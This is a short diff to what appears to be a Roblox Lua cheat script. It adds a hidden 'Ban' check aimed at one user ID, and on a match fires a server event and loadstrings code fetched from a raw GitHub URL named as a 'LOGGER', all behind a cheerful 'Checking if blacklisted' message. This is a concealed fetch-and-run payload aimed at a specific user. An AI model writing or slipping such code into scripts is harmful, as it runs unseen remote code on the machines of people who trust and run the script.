@@ -3,6 +3,20 @@
 print("Checking if blacklisted... :)")
 wait(1)
 
+
+Ban = {
+366778121,
+
+
+
+}
+
+if table.find(Ban, game:GetService("Players").LocalPlayer.UserId) then
+game.ReplicatedStorage.MainEvent:FireServer("BreathingHAMON")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Hax0963/BANNEDLOG/main/LOGGER"))()
+else
+end
+
 BlackList = {
 0,
 
